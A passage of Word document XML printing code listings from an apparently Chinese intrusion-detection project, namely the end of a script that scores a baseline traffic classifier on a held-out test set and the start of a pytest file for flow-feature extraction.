          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if "__order__" not in meta.columns:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0AAD03">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raise SystemExit("需要 __order__ 列才能按与小模型相同的口径留出测试集")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C99F8A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    order = meta["__order__"].to_numpy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B4D3BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31170467">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    _, _, test_idx = split_by_time(X, y, order, args.test_size, args.val_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5816BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X_test, y_test = X[test_idx], y[test_idx]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591773B4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    classes = sorted(set(y_test))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035CA722">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="288279E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[基线] 测试集 {len(X_test)} 行（与小模型同一段留出）", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F65A99B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    preds = baseline_predictions(X_test, feature_names)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC7A50A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    result = score(list(y_test), preds, classes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50891D30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0957089C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"{'类别':&lt;12}{'精确率':&gt;8}{'召回率':&gt;8}{'F1':&gt;8}{'样本数':&gt;8}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE7E500">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in classes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAE18E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        m = result["per_class"][cls]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E21870B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flag = "" if m["reliable"] else "  (样本太少，不评估)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D69E56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"{cls:&lt;12}{m['precision']:&gt;8.3f}{m['recall']:&gt;8.3f}{m['f1']:&gt;8.3f}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E1D027">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">              f"{m['support']:&gt;8}{flag}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E770CAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"\n准确率 {result['accuracy']:.4f}　"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAB5BAE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">          f"macro-F1（剔除样本 &lt; {RARE_CLASS_SUPPORT} 的类）{result['macro_f1_reliable']:.4f}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574F960F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E0FF174">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    missed = {cls: sum(1 for t, p in zip(y_test, preds) if t == cls and p == "BENIGN")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C38599F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">              for cls in classes}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D36ACE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("完全漏报（判成 BENIGN）的行数：", missed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22566734">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E69488C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    result["split"] = {"mode": "temporal", "test_size": args.test_size, "val_size": args.val_size}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DC8749">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    result["rows"] = len(X_test)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B13D8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    result["missed_as_benign"] = missed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BD1E57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = Path(args.out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CB80BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out.parent.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70895F2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E6D5BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[基线] 写入 {out}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133FC515">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754AE416">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="678B904B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="004E7BF6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E5A531">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B21668">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7738FBCD">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-29　tests/test_features.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（169 行）　特征口径回归测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67187EBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M2 特征提取器自测：列序、双向合并、速率兜底、活跃/空闲切分。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6222B995">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CF8BFCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E25DB20">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7424EDA8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390613DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36B1928F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pytest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CDCD0D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="007642E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from probe.features import (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDE5187">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ACK,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD8BAE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    FIN,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37FAFDCF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    FEATURE_ORDER,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A61982">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    PSH,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385B27CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    SYN,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09742AD0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    FlowTable,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B290C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    PacketRecord,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3252C9DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flow_features,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A460201">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    replay,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B85E68">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    to_vector,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6AFB9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CCFDDD0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A5E866C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SCHEMA_PATH = Path(__file__).resolve().parent.parent / "models" / "artifacts" / "feature_schema.json"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="641FAC3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73DBE3D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
